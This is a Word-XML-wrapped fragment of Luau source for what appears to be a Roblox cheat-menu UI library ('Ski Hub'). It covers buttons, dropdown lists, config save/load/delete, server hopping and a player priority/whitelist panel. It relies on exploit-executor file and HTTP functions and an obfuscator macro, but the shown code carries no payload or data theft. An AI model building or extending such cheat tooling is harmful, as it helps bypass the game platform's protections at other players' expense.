    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, -4, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -8, 0, 30);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(33, 33, 35)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"button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 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"button"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1, 0);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"name" ], "accent", "BackgroundColor3");                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "button" ].MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "name" ].TextColor3 = themes.preset.accent </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "name" ], {TextColor3 = rgb(245, 245, 245)})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library:settings(options)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open = false; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {}; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                sanity = true; -- made this for my own sanity.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items[ "outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Visible = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ClipsDescendants = true;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rgb(25, 25, 29)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"inline" ] = library:create( "Frame" , {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Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(22, 22, 24)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"inline"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"elements" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "inline"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10, 0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -20,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"elements" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 10);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PaddingBottom = dim(0, 15);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "elements" ]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"outline"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"fade"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"tick" ] = library:create( "ImageButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Image = "rbxassetid://128797200442698";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = self.items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 16, 0, 16);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               </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set_visible(bool)                 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "outline" ], {Size = dim_offset(bool and 240 or 0, 0)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "outline" ].Position = dim_offset(items[ "tick" ].AbsolutePosition.X, items[ "tick" ].AbsolutePosition.Y + 90)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:close_element(cfg)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items[ "tick" ].MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.open = not cfg.open</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set_visible(cfg.open)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)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library:list(properties) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                options = properties.options or {"1", "2", "3"};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = properties.flag or library:next_flag();    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = properties.callback or function() end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                data_store = {};        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                current_element;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "list" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = self.items[ "elements" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;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"list" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 10);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"list" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingLeft = dim(0, 4)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function cfg.refresh_options(options_to_refresh)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local old_selected_value = flags[cfg.flag] -- store current selected option string</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.current_element = nil -- reset current UI element</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option in cfg.data_store do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    option:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.data_store = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option_data in options_to_refresh do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local button = library:create("TextButton",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Parent = items["list"];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Size = dim2(1, 0, 0, 30);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rgb(33, 33, 35)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    }); cfg.data_store[#cfg.data_store + 1] = button;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local name = library:create("TextLabel", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextColor3 = rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = option_data;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = button;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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:create("UICorner", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = button;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    -- Apply selection highlight if this is the old selected option</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if option_data == old_selected_value then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(name, {TextColor3 = rgb(245, 245, 245)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.current_element = name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    button.MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local current = cfg.current_element </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if current and current ~= name then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(current, {TextColor3 = rgb(72, 72, 72)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        flags[cfg.flag] = option_data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.callback(option_data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(name, {TextColor3 = rgb(245, 245, 245)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.current_element = name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    name.MouseEnter:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if cfg.current_element == name then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(name, {TextColor3 = rgb(140, 140, 140)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    name.MouseLeave:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if cfg.current_element == name then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(name, {TextColor3 = rgb(72, 72, 72)})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end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.refresh_options(cfg.options)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  function library:init_config(window) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --window:seperator({name = "Settings"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local main, playerlist = window:tab({name = "Configs", tabs = {"Main", "Playerlist"}}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local column = main:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local section = column:section({name = "Configs", size = 1, default = false, icon = "rbxassetid://139628202576511"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            config_holder = section:list({options = {"Report", "This", "Error", "To", "Finobe"}, callback = function(option) end, flag = "config_name_list"}); library:update_config_list()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local column = main:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local section = column:section({name = "Settings", side = "right", size = 1, default = false, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:textbox({name = "Config name:", flag = "config_name_text"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = "Save",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local config_name = (flags["config_name_text"])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        writefile(library.directory .. "/configs/" .. config_name .. ".cfg", library:get_config())</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:update_config_list()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            name = "Configs",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            info = "Saved config to:\n" .. config_name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })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})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = "Overwrite",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local config_name = (flags["config_name_list"])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        writefile(library.directory .. "/configs/" .. config_name .. ".cfg", library:get_config())</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:update_config_list()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            name = "Configs",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            info = "Overwrote config :\n" .. config_name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })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})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = "Load",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local config_name = flags["config_name_list"]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:load_config(readfile(library.directory .. "/configs/" .. config_name .. ".cfg"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:update_config_list()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            name = "Configs",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            info = "Loaded config:\n" .. config_name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })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})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = "Delete",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local config_name = flags["config_name_list"]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        delfile(library.directory .. "/configs/" .. config_name .. ".cfg")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:update_config_list()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            name = "Configs",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            info = "Deleted config:\n" .. config_name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })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})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:colorpicker({name = "Menu Accent", callback = function(color, alpha) library:update_theme("accent", color) end, color = themes.preset.accent})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:keybind({name = "Menu Bind", key = Enum.KeyCode.Insert, callback = function(bool) window.toggle_menu(bool) end, seperator = true, default = true})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _request = (http_request and http_request) or (request and request) or (http and http.request)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({name = "Join Lowest Server", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Servers = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&amp;limit=100", tostring(game.PlaceId))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ListServers = function(cursor)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Raw = game:HttpGet(Servers .. ((cursor and "&amp;cursor="..cursor) or ""))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return Services.HttpService:JSONDecode(Raw)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Server, Next; repeat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Servers = ListServers(Next)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Server = Servers.data[1]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Next = Servers.nextPageCursor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                until Server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Server.id == game.JobId then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        info = `You are currently in the smallest server!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        lifetime = 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return  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Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, Server.id)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({name = "Server Hop", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Servers = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Request = _request({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&amp;limit=100&amp;excludeFullGames=true", tostring(game.PlaceId))})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Body = Services.HttpService:JSONDecode(Request.Body)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Body and Body.data then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _, Value in next, Body.data do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if type(Value) == "table" and tonumber(Value.playing) and tonumber(Value.maxPlayers) and Value.playing &lt; Value.maxPlayers and Value.id ~= game.JobId then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            table.insert(Servers, 1, Value.id)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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1, #Servers)])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({name = "Rejoin", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _column = playerlist:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _section = _column:section({name = "Players", size = 1, default = false})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local plr_list = _section:list({options = {}, flag = "player_list"});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            _column = playerlist:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            _section = _column:section({name = "Player Options", size = 1, default = false, side = 'right'})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _playerlabel = _section:label({name = "Selected Player : None"})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(0.01) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    _playerlabel.set(string.format("Selected Player : %s", library.flags["player_list"] or "None"))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local _statuslabel = _section:label({name = "Status : None"})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(0.01) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local playervalue = library.flags["player_list"]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local status</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if playervalue ~= nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if table.find(library.priority, playervalue) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            status = "&lt;font color='rgb(255,0,0)'&gt;Priority&lt;/font&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        elseif table.find(library.whitelist, playervalue) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            status = "&lt;font color='rgb(0,255,0)'&gt;Whitelisted&lt;/font&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            status = "None"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        status = "None"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    _statuslabel.set(string.format("Status : %s", status))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
